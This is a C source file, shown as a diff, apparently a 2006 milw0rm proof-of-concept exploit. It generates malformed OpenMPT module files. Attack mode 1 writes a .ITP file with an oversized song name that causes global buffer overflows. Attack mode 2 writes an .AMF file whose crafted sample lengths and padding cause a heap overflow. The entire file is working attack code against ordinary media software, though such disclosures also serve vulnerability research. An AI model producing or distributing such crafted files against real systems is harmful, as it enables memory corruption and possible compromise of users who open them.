@@ -1,0 +1,169 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+#ifdef WIN32
+    #include <winsock.h>    // htonl
+#else
+    #include <netinet/in.h>
+#endif
+
+
+
+#define VER             "0.1"
+#define HEAPOVERSZ      512
+#define ITPHEAPOVERSZ   150000
+#define ALLOCSAMPLESZ   ((39 & ~7) + 16)
+#define SONG_ITPROJECT  0x20000
+
+
+void fwbof(FILE *fd, int len, int chr);
+void fwi32(FILE *fd, int num);
+void std_err(void);
+
+
+
+#pragma pack(1)
+
+typedef struct {
+    uint8_t     sign[35];
+    uint8_t     patterns;
+    uint8_t     orders;
+    uint8_t     dunno1;
+    uint8_t     dunno2[256];
+} amf_head_t;
+
+typedef struct {
+    uint8_t     name[22];
+    uint8_t     finetune;
+    uint8_t     volume;
+    uint8_t     dunno1;
+    uint32_t    length;
+    uint32_t    reppos;
+    uint32_t    replen;
+} amf_smp_t;
+
+#pragma pack()
+
+
+
+int main(int argc, char *argv[]) {
+    amf_head_t      amf_head;
+    amf_smp_t       amf_smp;
+    FILE    *fd;
+    int     i,
+            attack;
+    char    *fname;
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "OpenMPT <= 1.17.02.43 and SVN <= 157 stack and heap overflows "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@autistici.org\n"
+        "web:    aluigi.org\n"
+        "\n", stdout);
+
+    if(argc < 2) {
+        printf("\n"
+            "Usage: %s <attack> <output_file>\n"
+            "\n"
+            "Attacks:\n"
+            " 1 = various global buffer overflows in ReadITProject (*.ITP)\n"
+            " 2 = heap overflow in ReadSample                      (*.AMF)\n"
+            "\n", argv[0]);
+        exit(1);
+    }
+
+    attack = atoi(argv[1]);
+    fname  = argv[2];
+
+    printf("- create file %s\n", fname);
+    fd = fopen(fname, "wb");
+    if(!fd) std_err();
+
+    if(attack == 1) {
+        fwi32(fd, 0x2e697470);          // .itp
+        fwi32(fd, 0x00000000);          // version
+        fwi32(fd, ITPHEAPOVERSZ);       // song name len
+        fwbof(fd, ITPHEAPOVERSZ, 'a');  // song name
+        fwi32(fd, 0);                   // comments len
+        fwi32(fd, SONG_ITPROJECT);      // m_dwSongFlags
+        fwi32(fd, 128);                 // m_nDefaultGlobalVolume
+        fwi32(fd, 0);                   // m_nSongPreAmp
+        fwi32(fd, 0);                   // m_nDefaultSpeed
+        fwi32(fd, 0);                   // m_nDefaultTempo
+        fwi32(fd, 0);                   // m_nChannels
+        fwi32(fd, 0);                   // channel name len
+        // for(i=0; i<m_nChannels; i++){
+        fwi32(fd, 0);                   // LoadMixPlugins len
+        fwi32(fd, 0);                   // m_MidiCfg len
+        fwi32(fd, 0);                   // m_nInstruments
+        fwi32(fd, 0);                   // path instruments len
+        fwi32(fd, 0);                   // order len
+        fwi32(fd, 0);                   // number of patterns
+        fwi32(fd, 0);                   // m_nPatternNames
+        fwi32(fd, 0);                   // m_lpszPatternNames len
+        fwi32(fd, 0);                   // modcommand data length
+        fwi32(fd, 0);                   // m_nSamples
+        fwi32(fd, 0);                   // Read number of embeded samples
+
+    } else if(attack == 2) {
+        memset(&amf_head, 0, sizeof(amf_head));
+        memset(&amf_smp,  0, sizeof(amf_smp));
+
+        strcpy(amf_head.sign, "ASYLUM Music Format V1.0");
+        amf_head.patterns = 1;
+        amf_head.orders   = 1;
+        fwrite(&amf_head, sizeof(amf_head), 1, fd);
+
+        for(i = 0; i < 64; i++) {
+            sprintf(amf_smp.name, "sample %d", i);
+            amf_smp.finetune = 0;
+            amf_smp.volume   = 64;
+            amf_smp.length   = ((0 - 6) - 39) + 16; // ReadSample and AllocateSample
+            amf_smp.reppos   = 0;
+            amf_smp.replen   = 0;
+            fwrite(&amf_smp, sizeof(amf_smp), 1, fd);
+        }
+
+        fwbof(fd, 64 * 32, 0x00);
+
+        fwbof(fd, ALLOCSAMPLESZ + HEAPOVERSZ, 'a');
+    }
+
+    fclose(fd);
+    printf("- finished\n");
+    return(0);
+}
+
+
+
+void fwbof(FILE *fd, int len, int chr) {
+    while(len--) fputc(chr, fd);
+}
+
+
+
+void fwi32(FILE *fd, int num) {
+    fputc((num      ) & 0xff, fd);
+    fputc((num >>  8) & 0xff, fd);
+    fputc((num >> 16) & 0xff, fd);
+    fputc((num >> 24) & 0xff, fd);
+}
+
+
+
+void std_err(void) {
+    perror("\nError");
+    exit(1);
+}
+
+// milw0rm.com [2006-08-10]
